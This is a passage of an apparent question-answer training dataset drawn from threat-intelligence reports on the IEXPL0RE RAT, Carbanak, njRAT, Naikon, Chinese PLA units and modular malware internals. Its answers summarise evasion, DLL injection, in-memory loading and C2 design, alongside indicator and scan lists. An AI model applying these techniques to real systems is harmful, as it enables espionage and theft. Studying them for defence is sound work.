DLL injection, allowing the program to run without a warning that the program is not digitally signed. StrokeIt, a program for using mouse gestures, uses a file named config.dll without verifying the authenticity of the file. By replacing config.dll with the RAT downloader, the malicious code is run while appearing more legitimate to the operating system (figure 3).\nBig Headline: MALWARE\nThe IEXPL0RE RAT is delivered inside an executable program or document, which is custom-generated for each email. When a user opens the document or runs the program, it installs a launcher program on the computer. Antivirus programs frequently fail to detect the launcher program as malicious, as it is custom built for each specific target: the file contains a configuration file unique to the target, which is different each time it is sent out. This method is used to defeat signature-based antivirus programs, which only scan for files that are known to be malicious. As the launcher program is newly generated every time, it will never end up on a signature list until after it is already been used.\nOnce installed on a system, the launcher program goes through multiple programs to unpack a contained file (the actual RAT) before it can run. The IEXPL0RE.EXE (or other launcher) program contains multiple programs, layered like an onion, which eventually unpack a DLL (dynamic link library, another form of executable file). The file name varies, but starts with \"perf\" and has an extension of .dat, and is saved to the %temp% folder (often C:\\Documents and Set-tings\\user\\Local Settings\\Temp).\nOnce the perf*.dat file is saved to disk, it runs (via injection into svchost.exe, a Windows program) and extracts another DLL into memory. This program is called \"ContainerV2,\" as it is referenced from within the program, although it is never written to the disk. ContainerV2 connects to the Internet and downloads another DLL called \"client\". The client is also kept in memory and never written to the disk. Once downloaded, ContainerV2 will run the client, which does all of the IEXPL0RE RAT work (figure 4).\nMedium Headline: FIGURE 4: STRUCTURE OF THE RAT LAUNCHER PROGRAM.\nFor Organization 1, the executable launch process looks like this:\n\u2022\u2022 .exe(attached file, launcher): appears as a text document; when run, displays a fake error message saying the file can't be found (figure 5)\n\u2022 csv.exe (runs and exits quickly)\n\u2022 360tray.exe (runs and exits quickly)\n\u2022 svchost.exe (with injected perf*.dat code)\n\u2022 ContainerV2 (injected into svchost.exe)\n\u2022 client (downloaded and run in memory)\nVery Small Headline: SOCIAL ENGINEERING TECHNIQUE: A FAKE ERROR MESSAGE HIDING THE FACT THAT THIS IS A PROGRAM.\nOne advantage of downloading the final stage is that if the attacker wanted to update the RAT software (to add new functionality for example), it can be done very easily. Because code is downloaded every time the malware starts, if the code is changed on the server side, existing compromised machines will automatically update themselves the next time they are restarted. Over the time spent analyzing this malware, the client program did have minor changes, possibly bug fixes.\nMD5 hashes, also called message digests, are often used to identify a file based on its content. A hash is a string of hexadecimal characters that identifies a file. Should the file change in any way, the hash will as well. Hashes are designed to be easy to compute from a full file, but it is very difficult to find two files with the same hash.\nUse of hashes in the context of the IEXPL0RE RAT is difficult, as the downloaded client may change, and the ContainerV2 program is different for every target. One of the main differences that guarantees that the hash will always be unique is that the configuration file for the RAT (including which command and control servers to connect to) is included in the program.\nFor reference some MD5 hashes of IEXPL0RE components include:\nBig Headline: INFECTION\nOnce the launcher program is run, it will install the IEXPL0RE binary and a startup link in the Start Menu:\nC:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\IEXPL0RE.LNK\nC:\\Documents and Settings\\user\\Application Data\\Microsoft\\Internet Explorer\\IEXPL0RE.EXE\nIt also leaves traces of the extracted binary and the link file (the .tmp file below) in %temp%:\nC:\\Documents and Settings\\user\\Local Settings\\Temp\\31A.tmp\nC:\\Documents and Settings\\user\\Local Settings\\Temp\\perf6cd2e5e9.dat\nThe RAT also uses a few files for configuration and recording keystrokes:\nC:\\WINDOWS\\system\\lock.dat\nC:\\WINDOWS\\system\\MSMAPI32.SRG\nC:\\WINDOWS\\system32\\STREAM.SYS\nWhen run, IEXPL0RE will connect to a command and control (C2) server for updates, sending key-logger data, and asking for RAT commands. The C2 server is specified in a configuration file built into the RAT program. Each RAT instance is likely built using a packaging program. The configuration file allows for a primary server and an alternate, and may use either a domain or IP.\nEach of the IEXPL0RE samples analyzed uses a different set of C2 servers. One sample uses two domains that point to the same IP. The IP changes every few days to few weeks, but remains in one network block located in China. Other samples use either a single domain name and no backup, or a fixed IP with a localhost address as backup. The localhost address is a way to find and use a proxy, for example, if a computer is using a circumvention system such as Tor. Of the two samples using fixed IPs, both were sent to the same organization, and one appears to be a replacement for the other. Both C2 servers are currently down.\nQ: How did the IEXPL0RE RAT ensure that each instance was unique, and what challenges did this pose for identifying the malware using MD5 hashes?",
    "output": "The IEXPL0RE RAT ensured that each instance was unique by including a configuration file unique to the target, which specified different command and control servers to connect to. This method guaranteed that the hash would always be unique, making it difficult to identify the malware using MD5 hashes. The downloaded client could change, and the ContainerV2 program was different for every target. Hashes are designed to be easy to compute from a full file but very difficult to find two files with the same hash. Therefore, the use of hashes in the context of the IEXPL0RE RAT was challenging because the configuration file for the RAT was included in the program, ensuring that the hash would always be unique.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Oracle Customer Notification\nAccording to media , Oracle Security provided a notification to Oracle MICROS customers on 8 August 2016, informing them of the following:\n\uf0a7 Oracle Security has detected and addressed malicious code in certain legacy MICROS systems\n\uf0a7 Oracle has confirmed that it's investigating a breach of its Micros division.\n\uf0a7 Oracle's own systems, corporate network, and other cloud and service offers were not impacted.\n\uf0a7 Oracle MICROS users will have to change their account passwords immediately\n\uf0a7 The company reportedly stated that payment data was not at risk, as that information is encrypted both at rest and in transit in the MICROS environment.\nAlthough Oracle has not provided additional details on the exact date or extent of the breach of Oracle MICROS, some media suggest that the support portal for MICROS clients was also compromised.\nMedium Headline: Carbanak\nOn 8 August 2016, a media reported that the \"Oracle's MICROS customer support portal was seen communicating with a server known to be used by the \"Carbanak.\"\nAccording to , in February 2015, the Carbanak group used techniques commonly seen in Advanced Persistent Threat (APT) incidents to successfully target one financial institution's (a bank) money processing services, Automated Teller Machines (ATM) and financial accounts. In some cases, Oracle\ndatabases were manipulated to open payment or debit card accounts at the same bank or to transfer money between accounts using the online banking system. The ATM network was also used to dispense cash from certain ATMs at certain times where money mules were ready to collect it as part of this operation.\nIn March 2015, provided an industry-wide public alert and mitigation guidance concerning Carbanak. Visa recommends that all financial institutions and retailers scan their networks for the presence of Carbanak. If detected, please contact law enforcement immediately and activate security incident procedures.\nBig Headline: 2. Mitigation action recommended for Oracle Micros Customers\n\u2022 Change passwords for any account used by a MICROS representative to access the customer's on-premises systems.\n\u2022 Scan network for the following:\n\u2013 Psexec file\n\u2013 Files with .bin extension (located in \\All users\\%AppData%\\Mozilla\\ or c:\\ProgramData\\Mozilla\\)\n\u2013 Svchost.exe file (located in Windows\\System32\\com\\catalogue\\)\n\u2013 Svchost.exefile (located in C:\\ProgramData\\Mozilla\\svchost.exe)\n\uf0a7 This file provided remote access functions, such as the ability to execute arbitrary commands, upload/download files.\n\u2013 Operating system (Windows) running services ending in \"sys\"\n\u2022 Scan networks for IOCs linked to Carbanak:\n\u2022 Scan networks for IOCs linked to MalumPOS:\n\u2022 Additionally, Visa recommends the following best practices to reduce the risk of exposure:\n\u2013 Educate employees how to avoid phishing scams and opening emails with attachments\n\u2013 Maintain updates for all software and patches (address zero day vulnerabilities)\n\u2013 Turn on heuristics (behavioral analysis) on anti-malware to search for suspicious behavior\nVisa will continue to report any mitigation guidance, technical indicators of compromise associated with this compromise, or additional details on the overall extent of the compromise as details are made available.\nFor questions and information please contact,\nTo report a data breach, contact Visa Fraud Control:\n\u2022 Asia Pacific Region, Central Europe/Middle East/Africa Region: VIFraudControl@visa.com\n\u2022 U.S. and Canada: USFraudControl@visa.com\n\nQuestion: What are the key mitigation actions recommended by Visa for Oracle MICROS customers to secure their systems following the detection of malicious code, and why are these steps important?\n\nAnswer:",
    "output": "Visa recommends several key mitigation actions for Oracle MICROS customers: changing passwords for any account used by a MICROS representative to access the customer's on-premises systems; scanning the network for specific files and services such as Psexec, .bin files, svchost.exe, and operating system services ending in 'sys'; and scanning networks for Indicators of Compromise (IOCs) linked to Carbanak and MalumPOS. These steps are important because they help ensure that any compromised credentials are no longer usable, identify and remove potential backdoors or malicious files, and detect the presence of known threats associated with the breach. Additionally, Visa recommends educating employees about phishing scams, maintaining software updates and patches, and turning on heuristics on anti-malware to search for suspicious behavior, which are essential best practices for reducing the risk of exposure to cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: 3 Reactions and Responses\nInformation campaigning, facilitated by cyber activities, contributed powerfully to Russia's ability to prosecute operations against Ukraine in the early stages of the conflict with little coordinated opposition from the West. The fact that for almost a year the EU was unable to refer publicly to the presence of Russian troops in Ukraine23 denotes a broader inability to challenge the Russian version of events without which a meaningful response is difficult or impossible. Early media coverage of the conflict made it 'apparent \u2026 that some interlocutors had swallowed whole some of the cruder falsifications of Russian propaganda'. 24\nAs the realisation of the nature of the Russian information campaign began to filter through Western media and policy-making circles, this gave way to a dangerous optimism about the effectiveness of Russian measures, and a widespread assumption that Russian disinformation was failing because of its lack of plausibil-\nity. Supposedly, Russian lies were ineffective because they were so obvious that they did not confuse senior and intelligent individuals in the West. But this was to underestimate the effects of layered messaging, subtlety screened and concealed by more obvious fabrications, continued saturation, and in particular the pernicious effect of the 'filter bubble' on online reading habits \u2013 the way personalised search results driven by advertising models can effectively isolate internet users from alternative information and viewpoints.25\n22 '\u041a\u0440\u0438\u043c\u0441\u044c\u043a\u0456 \u0440\u0435\u0433\u0456\u043e\u043d\u0430\u043b\u044c\u043d\u0456 \u043f\u0456\u0434\u0440\u043e\u0437\u0434\u0456\u043b\u0438 \u041f\u0410\u0422 \u00ab\u0423\u043a\u0440\u0442\u0435\u043b\u0435\u043a\u043e\u043c\u00bb \u043e\u0444\u0456\u0446\u0456\u0439\u043d\u043e \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u044f\u044e\u0442\u044c \u043f\u0440\u043e \u0431\u043b\u043e\u043a\u0443\u0432\u0430\u043d\u043d\u044f \u043d\u0435\u0432\u0456\u0434\u043e\u043c\u0438\u043c\u0438 \u0434\u0435\u043a\u0456\u043b\u044c\u043a\u043e\u0445 \u0432\u0443\u0437\u043b\u0456\u0432 \u0437\u0432'\u044f\u0437\u043a\u0443 \u043d\u0430 \u043f\u0456\u0432\u043e\u0441\u0442\u0440\u043e\u0432\u0456', Ukrtelekom, 28 February 2014, http://www.ukrtelecom.ua/presscenter/news/offi-cial?id=120327.\n23 Andrew Rettman,. 'EU breaks taboo on 'Russian forces in Ukraine'', EU Observer, 16 February 2015, https://euobserver.com/ foreign/127667.\n24 John Besemeres. 'Russian disinformation and Western misconceptions', Inside Story, 23 September 2014, http://insidestory.org. au/russian-disinformation-and-western-misconceptions.\nImplausibility is irrelevant for Russian objectives.\nRussian official sources continue to disseminate lies which are easily detected and discredited in the West, as with the striking example of the 'discovery' of supposed US MANPADS in Donetsk in late July 2015.26 But the implausibility is irrelevant for Russian objectives: the story has been planted and will continue to be disseminated via the internet, and will not be contradicted in mainstream sources within Russia. Instead of convincing Western readers that the disinformation is true, Russian success is defined in two other ways: isolating the domestic audience from non-approved information so that Russian state actions are permissible; and influencing foreign decision making by supplying polluted information, exploiting the fact that Western elected representatives receive and are sensitive to the same information flows as their voters. When Russian disinformation delivered in this manner is part of the framework for decisions, this constitutes success for Moscow, because a key element of the long-standing Soviet and Russian approach of reflexive control is in place.\nCrucially, it must be remembered that Russian disinformation campaigns aimed at the West are conducted not only in NATO languages, but also in Arabic and Russian targeting minorities across Europe. This itself has major implications for managing future confrontations between Russia and other front-line states, which must involve finding a means to respond to Russian information operations when the initiative necessarily lies with Russia. As put pithily by journalist and author Peter Pomerantsev, 'they will always win the narrative war, because they can make stuff up'. 27\nFor the time being, much of the Western response appears focused on finding a label for the newly-demonstrated Russian way of warfare. A range of early contenders, such as 'non-linear war', 'ambiguous war' and others have largely been abandoned in favour of 'hybrid warfare', a concept originally designed for describing insurgency rather than warfighting by an aspiring regional power, but now applied to a totally new situation. Nevertheless many of the components now being used to define hybridity are nothing new in Russian practice. One argument\nholds that a previous round of expansionism by Russia in 1939-40 shared sufficient characteristics with current operations around Ukraine, including intimidation, spurious legitimation, and information campaigns backed with the prospect of full-scale invasion, to also be called hybrid warfare.28 Russia's clinging to the attitudes and approaches of a former age holds other dangers too: Russian military, and in particular nuclear, messaging is baffling to its Western audience because the post-nationalist West has moved on from the Cold War mind-set in which it is rooted. The result is a dangerous situation where the messages from Russia are received, but not understood.\n25 'How to Burst the 'Filter Bubble' that Protects Us from Opposing Views', MIT Technology Review, 29 November 2013, http:// www.technologyreview.com/view/522111/how-to-burst-the-filter-bubble-that-protects-us-from-opposing-views/.\n26 Brian Ashcraft. 'Pro-Tip: Don't Copy Battlefield 3 Stingers', 23 July 2015, Kotaku.com, http://kotaku.com/pro-tip-dont-copy-battlefield-3-stingers-1719695507.\n27 Speaking at the Lennart Meri Conference, Tallinn. 24 April 2015.\n\nHow does the 'filter bubble' phenomenon contribute to the effectiveness of Russian disinformation campaigns, and what are the broader implications for managing future confrontations with Russia?",
    "output": "The 'filter bubble' phenomenon contributes to the effectiveness of Russian disinformation campaigns by isolating internet users from alternative information and viewpoints. Personalized search results driven by advertising models can effectively create echo chambers where users are exposed primarily to information that aligns with their existing beliefs. This makes it easier for Russian disinformation to spread unchallenged. The broader implications for managing future confrontations with Russia include the need to find effective means to respond to Russian information operations, especially considering that the initiative often lies with Russia. These operations are conducted not only in NATO languages but also in Arabic and Russian, targeting minorities across Europe, which complicates the response strategy.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the analysis of MITRE ATT&CK techniques for UNC2452 reveal challenges in attribution, and what specific issues were encountered?",
    "output": "The analysis of MITRE ATT&CK techniques for UNC2452 revealed several challenges in attribution. First, there were significant differences in documented ATT&CK techniques between vendors analyzing the same actor group and/or malware. For example, FireEye listed seven techniques and ten sub-techniques, while Microsoft showed four techniques and six sub-techniques for the same actor. Second, several techniques for APT29 and APT41 were missing from the ATT&CK groups cataloged by MITRE, leaning towards more recent attacks. Third, there were instances where ATT&CK lacked the nuanced matching techniques described by security reporting. For instance, the technique T1078 Valid Accounts was automatically assigned to multiple tactics, while Microsoft limited its applicability to the Persistence tactic. Additionally, some techniques gained meaning through repeated applications and choices of what to encode, such as the use of a salted FNV-1a hashing algorithm for encoding blacklisted domains and processes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Threat Intelligence\nInvestigating the domain idsadesk[.]in (which was used to send the email by impersonating the identity of IDSA) shows that it was created on 20th Feb 2017 (which is the day before the spear-phishing email was sent to the victims). Most of the registrant information seems to be fake and another notable detail that is of interest is the registrant country and country code (+92) of registrant phone number is associated with Pakistan.\nFurther investigation shows that the same registrant email id was also used to register another similar domain (idsagroup[.]in) which also impersonates the identity of IDSA. This impersonating domain was also registered on the same day 20th February 2017 and this domain could also be used by the attackers to send out spear-phishing emails to different targets.\nWhile investigating the malware's uninstall/delete functionality it was determined that malware creates a batch script to delete all its files but before deleting all the files it pings 10 times to an hard coded IP address 180[.]92[.]154[.]176 as shown below.\nInvestigating this hard coded IP address shows that it is located in Pakistan. The Pakistan connection in the whois (<https://cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/>)information and the hard coded IP address is interesting because the previous two attacks against Indian Ministry of External Affairs and also had a Pakistan connection. Based on just the whois information (which can be faked) and the location of the IP address it is hard to say if the Pakistan espionage group is involved in this attack, but based on the email theme, tactics used to impersonate Indian think tank (IDSA) and the targets chosen that possibility is highly likely. Below screen shot shows the location of the hard coded IP address.\nMedium Headline: Indicators Of Compromise (IOC)\nIn this campaign the cyber espionage group targeted Central Bureau of Investigation (CBI) but it is possible that other government entities could also be targeted as part of this attack campaign. The indicators associated with this attack are provided so that the organizations (Government, Public, Private organizations and Defense sectors) can use these indicators to detect, remediate and investigate this attack campaign. Below are the indicators\nBig Headline: Conclusion\nAttackers in this case made every attempt to launch a clever attack campaign by impersonating the identity of highly influential Indian Think tank to target Indian investigative agency and the officials of the Indian army by using an email theme relevant to the targets. The following factors in this cyber attack suggests the possible involvement of Pakistan state sponsored cyber espionage group to spy or to take control of the systems of the officials of Central Bureau of Investigation (CBI) and officials of the Indian Army.\nUse of domain impersonating the identity of highly influential Indian think tank\nVictims/targets chosen (CBI and Army officials)\nUse of Email theme that is of interest to the targets\nLocation of one of the hard coded IP address in the binary\nUse of the same C2 infrastructure that was used to target (<https://ciso.economictimes.indiatimes.com/news/cyber-security-team-discover-coordinated-attempt-of-hackers-targeting-senior-army-officers/58007868>)senior army officers\nThe attackers in this case used multiple techniques to avoid detection and to frustrate analysts. The following factors reveal the attackers intention to remain stealthy and to gain long-term access by evading analysis and security monitoring at both the desktop and network levels.\nUse of password protected macro to prevent viewing the code and to make manual analysis harder\nUse of TextBox within the UserForm to store malicious content to bypass analysis tools\nUse of legitimate service like Google drive to store the list of back up C2 servers to bypass security monitoring and reputation based devices.\nUse of malware that performs various checks before performing any malicious activity\nUse of backup C2 servers and hosting sites to keep the operation up and running\nUse of hosting provider to host C2 infrastructure\nRead the text above and answer this question: What techniques did the attackers use to avoid detection and ensure long-term access to the victims' systems, and how did they utilize legitimate services to bypass security monitoring?",
    "output": "The attackers employed several techniques to avoid detection and ensure long-term access to the victims' systems. They used password-protected macros to prevent easy viewing of the code and make manual analysis harder. They also stored malicious content within a TextBox in a UserForm to bypass analysis tools. To further evade detection, the attackers utilized legitimate services like Google Drive to store a list of backup Command and Control (C2) servers, which helped bypass security monitoring and reputation-based devices. The malware performed various checks before executing any malicious activity and used backup C2 servers and hosting sites to maintain operational continuity. Additionally, the attackers hosted their C2 infrastructure on a hosting provider to further complicate detection efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nIn the past thirty days (30) an increase attack activity has been observed using the \"njRAT\" malware. This remote access trojan (RAT) has capabilities to log keystrokes, access the victim's camera, steal credentials stored in browsers, open a reverse shell, upload/download files, view the victim's desktop, perform process, file, and registry manipulations, and capabilities to let the attacker update, uninstall, restart, close, disconnect the RAT and rename its campaign ID. Through the Command & Control (CnC) server software, the attacker has capabilities to create and configure the malware to spread through USB drives.\n\"njRAT\" is currently leveraged by advanced threat actors in the Middle East, in particular when delivered via HTTP (i.e. Phishing attack or Drive-by download). It has also been observed that attackers are delivering \"njRAT\" embedded in other applications (i.e. L517 v.0.994 Word List Generator), and compressed with EZIRIZ .NET Reactor/.NET protector. Obfuscation with the use of compressors or protectors is a technique used by attackers to prevent detection by network-based and host-based security defenses.\nWe have observed the majority of the attacks leveraging \"njRAT\" to be against organizations based in or focused on the Middle East region in the government, telecom, and energy sectors. However as this is a publicly available tool it can be attained and deployed with ease regardless of location or industry.\nDuring the analysis of \"njRAT\", it was observed that some of the top antivirus vendors were not currently detecting some variants of this threat.\nSome of the file names of carrier files or njRAT samples observed were: L517 v0.994.exe, RealUpgrade.exe, password hotmail cracker 2013.exe, elisa.exe, Crack All Games.exe, fresh cc\nwrittenapprovalofFidelisSecuritySystems,Inc.\nUsersaregrantedpermissiontocopyand/ordistributethisdocumentinitsoriginalelectronicformandprintcopiesforpersonaluse.Thisdocumentcannotbemodifiedorconvertedtoanyotherelectronicormachine-readableforminwholeorinpartwithoutpriorWhileThreatweAdvisoryhavedone#1009ourbesttoensurethatthematerialfoundinthisdocumentisaccurate,FidelisSecuritySystems,Rev.Inc.2013-06-25makesnoguaranteethattheinformationcontainedhereiniserrorfree.Page1of27Copyright\u00a92013GeneralDynamicsFidelisCybersecuritySolutions\n\"njRAT\" Uncovered\ncvv all info 2013_txt.scr, spoolsv.exe, Hack Origin Game's.exe, Authorization form may - 2013 - 115444.scr, and Authorization.exe.\nThis document will provide detailed information about the njRAT's functionality, file system indicators, network indicators, some of the campaign IDs observed, MD5 hashes, and domains. It will also go over a detailed analysis of one of the malware variants.\n\nBased on the above text, answer a question. How does the 'njRAT' malware leverage obfuscation techniques to evade detection, and what specific tools are mentioned in the report? Explain the significance of these techniques in the context of advanced persistent threats.",
    "output": "The 'njRAT' malware leverages obfuscation techniques to evade detection by network-based and host-based security defenses. Specifically, it has been observed being embedded in other applications, such as the 'L517 v.0.994 Word List Generator,' and compressed with tools like EZIRIZ .NET Reactor/.NET protector. These techniques are significant because they make it harder for security solutions to identify and block the malware, allowing it to remain undetected and persist within the target environment. This is particularly concerning in the context of advanced persistent threats, where the goal is long-term, stealthy access to sensitive information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: PLA Unit 61398/ Comment Crew/ APT1\nThe 3rd and 4th Departments of the People's Liberation Army (PLA) General Staff Department (GSD) supposedly houses China's electronic warfare operations. Unit 61398 is the Military Unit Cover Designator of the Chinese state sponsored advanced persistent threat that operates out of the 2nd Bureau of the 3rd Department of PLA GSD, located off Datong road in Pudong in Shanghai.\nUnit 61398 is tasked with computer network operations. It operates on four large networks in Shanghai. Two of these networks serve the Pudong region. The Unit has a dedicated fiber optics connection that was paid for in the name of national defense. The 3rd Department employs over 130,000 employees. Unit 61398 consists of personnel who are proficient in English and trained in computer security and computer network operations. Members of Unit 61398 use Chinese (Simplified) keyboard settings. Most of the IP addresses and the infrastructure used in the attacks trace back to China.\nUnit 61398 targets sectors that are of interest to China's 12th Five Year Plan. They are large enough and well-resourced enough that it can simultaneously compromise dozens of organizations. This adversary has breached over 150 organizations since its inception in\n2002. The majority of victims are located in the United States. Information Technology organizations, Aerospace firms, Public Administration agencies and other technology heavy sector are targets for Unit 61398. The adversary targets intellectual property data and financial data. It exfiltrates intellectual property data, proprietary documents, business plans, emails, and contacts.\nAttacks begin with spear phishing emails that contain a malicious file or a malicious link. The emails are personalized to the target and may not easily be distinguished from legitimate emails. Attachments are usually in the ZIP format. Once the victim system is compromised, the attacker establishes a persistent presence by installing a backdoor from the dropper delivered from the email. The backdoor initiates contact with the C2C infrastructure from inside the network so that the traffic can bypass internal firewalls. The actor typically relies upon WEBC2 backdoors, which are minimally featured beachhead backdoors. WEBC2 can only communicate with a C2C server through comments. Sometimes the BISCUIT backdoor is used if more functionality is needed. BISCUIT uses the HTTP protocol for communication and it features modules to capture screenshots, log keystrokes, record system information, modify processes, modify the registry, execute code, log off or shut down the session, and other features. Unit 61398 remains persistent on the compromised system and it may revisit the system over the course of months or years. The group remains on the network for 1-5 years. During this time, the group escalates their privileges using login credentials that it gathers from publicly available tools built into the initial malware. Next, they conduct network reconnaissance, by typing commands into the command shell. Finally, they laterally move across the network to infect new systems and they maintain their presence on the infected network. Unit 61398 compresses stolen data into multiple files with a RAR archiving utility and exfiltrates the data through their backdoor or through File Transfer Protocol (FTP).\nMedium Headline: Putter Panda/ APT2/ PLA Unit 61486\nPutter Panda is connected to the People's Liberation Army's (PLA) Third General Staff Department (GSD) 12th Bureau Military Unit Cover Designator (MUCD) 61486. Unit 61486 supports China's space surveillance network. The group may be responsible for space based signal intelligence (SIGINT) collection. The group has been actively conducting attacks since at least 2007 and is based out of the Zhabai district of Shanghai, China. Unit 61486 shares some infrastructure with Unit 61398.\nPutter Panda targets the United States Government, Defense sector, Research sector, and Technologies sectors. According to CrowdStrike, the United States Defense\nindustry, communication industries, and European satellite and aerospace industries are particularly targeted.\nPutter Panda relies on spear phishing emails containing malicious PDFs and Microsoft Word Documents to infect its target. Putter Panda's exploit kit includes two droppers, two RATs, and two tools. One dropper delivers a payload, such as the 4H RAT, to the victim system and installs it. The other dropper exclusively delivers the PNGDOWNER tool. Putter Panda uses the 4H RAT and the 3PARA RAT. The 4H RAT can initiate a remote shell, enumerate running processes, terminate processes, list files and directories, modify timestamps, upload files, download files, and delete files. The RAT communicates over HTTP and the communication is obfuscated by an operation, 1-byte XOR with the key 0xBE. The 3PARA RAT is a second stage, failsafe tool that allows the attacker to regain control of the system if their initial access vector is removed. The 3PARA RAT creates a file map at startup to verify that there is not another instance of the RAT running. The RAT is capable of remaining dormant for prearranged or commanded periods of time. The RAT only has limited commands, which include retrieving file or disk metadata, changing the working directory of the current C2 session, executing a command, and listing the current working directory. The first tool, PNGDOWNER is a simple download and execute tool. The second tool, HTTPCLIENT is a backup tool. The 3PARA RAT communicates over HTTP and authenticates with a 256-byte hash and a hard-coded string.\nMedium Headline: Naikon / APT 30\nThe Naikon group is one of the most active APT groups in Asia. Since 2010, it has launched spear phishing campaigns into organizations surrounding the South China Sea, intent on harvesting geo-political intelligence from civilian and military government organizations in the Philippines, Malaysia, Cambodia, Indonesia, Vietnam, Myanmar, Singapore, Nepal, Thailand, Laos, and China. The actors speak native Chinese. Based on the choice of targets, the operating language, and the sophistication of the toolkit, there is a distinct possibility that Naikon is a Chinese state sponsored threat group.\nSpear phishing campaigns begin with a lure email relevant to the victim that carries a malicious Microsoft Word document, which, according to Kaspersky Lab, actually contains \"a CVE-2012-0158 exploit, an executable with a double extension, or an executable with an RTLO filename\". One of its most prolific spear phishing campaigns was the March 2014 attacks targeting organizations from countries affected by the MH370 tragedy. Upon opening/ execution, the malicious payload, an 8kb encrypted file and configuration data, is injected into the browser memory where it decrypts the ports and paths to the C2C server, a user agent\nstring, filenames and paths to relevant components, and hash sums of the user API functions. The malicious code downloads the main malware from the C2C server over an SSL connection and then it loads it independently of the operating system functions without saving it to the hard drive by assuming control of the XS02 function and then handling the installation in memory.\nThe main component of the Naikon platform is a remote administration component. According to Trend Micro, the RARSTONE backdoor (BKDR_RARSTONE.A) can obfuscate itself by \"decrypting and loading a backdoor 'executable file' directly into memory without the need to drop the actual 'executable file.'\" The backdoor installs like a Plug X backdoor, injecting code into hidden instances of internet explorer. The module establishes a connection to the C2C server to receive and execute any of an estimated 48 commands from the adversary on the host. These commands include profiling the system, uploading and downloading data, executing arbitrary code, installing other modules, or executing commands via the command line. The backdoor routine also has the ability to get installer properties from Uninstall Registry key entries, which allow it to silently uninstall applications that interfere with the malware. The espionage malware collects email messages, monitors victims' keystrokes and screens in real time, and monitors network traffic.\nThe command and control infrastructure is minimalistic and organized according to locations of victims and targets. Communication protocol varied according to target. Some systems connected directly to the C&C servers while other systems were routed through dedicated proxy servers. The proxy servers were victim hosts running the XSControl software, which accepted incoming connections and routed them to relevant C&C servers. The proxy server application also offered a GUI administration utility, logged client and operator activity, and transmitted logs to an FTP server. The operator logs contained an XML database of downloaded files (including a timestamp, the remote path and the local path), a database of filenames and victim registry keys, and a history of executed commands.\nPerhaps the largest news story involving Naikon was the report by Kaspersky Lab that a rival APT in the region, dubbed the Hellsing group, had attacked the Naikon group. In March 2014, Hellsing group received a spear phishing email from Naikon and Hellsing responded with a reply message containing a locked malicious RAR archive labeled \"confidential data.\" The archive contained two PDFs and a SCR file, a backdoor specifically customized to target the Naikon group. The backdoor can upload and download files, update itself, and uninstall itself.\nQuestion: Describe the command and control infrastructure used by the Naikon group. How is communication handled, and what role do proxy servers play in this infrastructure?",
    "output": "Answer: The command and control infrastructure used by the Naikon group is minimalistic and organized according to the locations of victims and targets. Communication protocol varies according to the target. Some systems connect directly to the C&C servers while other systems are routed through dedicated proxy servers. The proxy servers are victim hosts running the XSControl software, which accepts incoming connections and routes them to relevant C&C servers. The proxy server application also offers a GUI administration utility, logs client and operator activity, and transmits logs to an FTP server. The operator logs contain an XML database of downloaded files (including a timestamp, the remote path, and the local path), a database of filenames and victim registry keys, and a history of executed commands.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: xii) awdcxc32 module\nThis library is injected into the \"EXPLORER.EXE\" prcess by the LoadDLL driver component.\nAll the functionality is implemented in the DllMain function.\nConnects to the \"vchw9x\" component using a pipe by name taken from the configuration block (\"\\\\.\\pipe\\{807BF02B-3F5F-4570-970A-8AADBAA55AC1}\") and communicates with the C&C server using that component.\nAll communication between the component and the server is encrypted using the RC4 encryption algorithm. The encryption key is read from the configuration block and equals to the string \"Caguen1aMar\" in all the configurations we discovered. It also loads additional libraries specified in the configuration, i.e. \"mfcn30\".\nThe module can execute the following commands provided by the C&C server:\nThe files received from the C&C server can be saved to the default Windows, Temporary or System directories, or any other location specified in the command.\nMedium Headline: xiii) mfcn30 module\nThis library is loaded by \"awcodc32\". It provides a framework for extending the malware with additional plugins and sending the results of their data collection routines to the C&C server.\nFile type: PE32/PE32+ DLL\nFile location: %windows%\\System32\\mfcn30.dll\nCompilation timestamps:\n2012.07.03 19:53:03 (GMT),\n2012.07.03 19:55:23 (GMT),\n2013.03.22 11:55:12 (GMT)\nFile sizes: 15872, 17920 bytes\nExports:\n77001295: DllCanUnloadNow\n7700129E: DllGetClassObject\nTechnical details\nAll the functionality is implemented in the DllMain function.\nConnects to the \"vchw9x\" component using a pipe name from the configuration block\n\\\\.\\pipe\\{807BF02B-3F5F-4570-970A-8AADBAA55AC1} for interacting with C&C server.\nThe module reads a list of additional plugin DLLs from the configuration block, loads these libraries and then periodically queries them for collected information. The results are sent to the C&C server via the pipe interface provided by \"vchw9x\".\nMedium Headline: xiv) vchw9x module\nThis module implements network connectivity features for the SGH components.\nFile type: PE32/PE32+ DLL\nFile location: %windows%\\System32\\vchw9x.dll\nCompilation timestamps: 2012.07.03 19:53:02 (GMT), 2012.07.03 19:55:21 (GMT), 2013.03.22 11:55:11 (GMT)\nFile sizes: 18432, 20992, 22528 bytes\nExports:\n78001977: DllCanUnloadNow\n78001980: DllGetClassObject\nTechnical details\nThis library is injected by the LoadDLL driver into processes from the following list:\nIEXPLORE.EXE\nFIREFOX.EXE\nMOZILLA.EXE\nOPERA.EXE\nNETSCAPE.EXE\nEMULE.EXE\nCHROME.EXE\nAll the functionality is implemented in the DllMain function.\nCreates the pipe:\n\\\\.\\pipe\\{807BF02B-3F5F-4570-970A-8AADBAA55AC1}\nand processes commands sent via this pipe by other modules.\nOnce a command is received, it passes the network request to Wininet functions and returns the results to the caller module via the same pipe.\nMedium Headline: xv) jpeg1x32 module\nFile type: PE32 DLL\nFile location: 